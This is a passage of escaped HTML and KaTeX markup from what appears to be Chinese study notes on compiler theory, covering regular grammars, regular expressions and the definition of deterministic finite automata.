class=\"mord\">0</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span></span></span></p>\n<p>由第三式和第二式，有</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>=</mo><mn>0</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>01</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>0</mn><mspace linebreak=\"newline\"></mspace><mi>A</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mi mathvariant=\"normal\">∣</mi><mn>01</mn><mo stretchy=\"false\">)</mo><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">A=0A|01A|0 \\\\\nA=(0|01)A|0\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord\">0</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord\">0</span></span></span></span></span></p>\n<p>所以</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mi mathvariant=\"normal\">∣</mi><mn>01</mn><msup><mo stretchy=\"false\">)</mo><mo>∗</mo></msup><mn>0</mn><mspace linebreak=\"newline\"></mspace><mi>Z</mi><mo>=</mo><mn>0</mn><mo stretchy=\"false\">(</mo><mn>0</mn><mi mathvariant=\"normal\">∣</mi><mn>01</mn><msup><mo stretchy=\"false\">)</mo><mo>∗</mo></msup><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">A=(0|01)^{*}0 \\\\\nZ=0(0|01)^{*}0\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord\">0</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord\">0</span></span></span></span></span></p>\n<h5 id=\"正规式转换正规文法\"><a class=\"markdownIt-Anchor\" href=\"#正规式转换正规文法\"></a> 正规式转换正规文法</h5>\n<p>假设存在字母表<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>和正规式，需要转换为正规文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>V</mi><mi>T</mi></msub><mo>=</mo><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">V_{T}=\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>。</li>\n<li>对原始正规式<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>R</mi></mrow><annotation encoding=\"application/x-tex\">R</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span></span></span></span>选择一个nonterminal <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Z</mi></mrow><annotation encoding=\"application/x-tex\">Z</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span></span></span>，生成规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Z</mi><mo>→</mo><mi>R</mi></mrow><annotation encoding=\"application/x-tex\">Z\\rightarrow R</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span></span></span></span>，令<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mo>=</mo><mi>Z</mi></mrow><annotation encoding=\"application/x-tex\">S=Z</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span></span></span>。</li>\n<li>若存在形如<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow ab</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span></span></span></span>的规则，转换为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow \\alpha B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>B</mi><mo>→</mo><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">B\\rightarrow b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>。</li>\n<li>若存在形如<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><msup><mi>a</mi><mo>∗</mo></msup><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow a^{*}b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\">b</span></span></span></span>的规则，转换为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow aA|b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">b</span></span></span></span>。</li>\n<li>重复3和4，直到没得转换。</li>\n</ol>\n<h3 id=\"有穷自动机\"><a class=\"markdownIt-Anchor\" href=\"#有穷自动机\"></a> 有穷自动机</h3>\n<p>有穷自动机是具有<strong>离散输入</strong>和<strong>输出系统</strong>的一种抽象数学模型，分为确定有穷自动机和非确定有穷自动机，两者都能准确识别正规集。</p>\n<h4 id=\"确定有穷自动机-dfa\"><a class=\"markdownIt-Anchor\" href=\"#确定有穷自动机-dfa\"></a> 确定有穷自动机 DFA</h4>\n<p>一个DFA是一个五元组<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">Σ</mi><mo separator=\"true\">,</mo><mi>f</mi><mo separator=\"true\">,</mo><mi>S</mi><mo separator=\"true\">,</mo><mi>Z</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">M=\\left(Q,\\Sigma,f,S,Z\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">Σ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，其中</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是一个有穷状态集合，集合中每一个元素是一个<strong>状态</strong>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>是一个有穷输入字母表，表中每个元素称为一个<strong>输入字符</strong>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span></span></span></span>是一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi><mo>×</mo><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">Q \\times \\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>到<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>的单射，即<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mrow><mo fence=\"true\">(</mo><msub><mi>q</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><mi>a</mi><mo fence=\"true\">)</mo></mrow><mover><mo><mo>→</mo></mo><mi>f</mi></mover><msub><mi>q</mi><mi>j</mi></msub><mi mathvariant=\"normal\">，</mi><mi mathvariant=\"normal\">其</mi><mi mathvariant=\"normal\">中</mi><msub><mi>q</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><msub><mi>q</mi><mi>j</mi></msub><mo>∈</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi>a</mi><mo>∈</mo><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\left(q_{i},a\\right)\\stackrel{f}{\\rightarrow} q_{j}，其中q_{i},q_{j} \\in Q,a \\in \\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.450086em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.200086em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">→</span></span></span><span style=\"top:-3.613978em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8252079999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mo>∈</mo><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">S \\in Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是唯一的一个初态；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Z</mi><mo>⊆</mo><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">Z \\subseteq Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8193em;vertical-align:-0.13597em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⊆</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是终态集合。</li>\n</ol>\n<p>当前状态为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">q_{i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 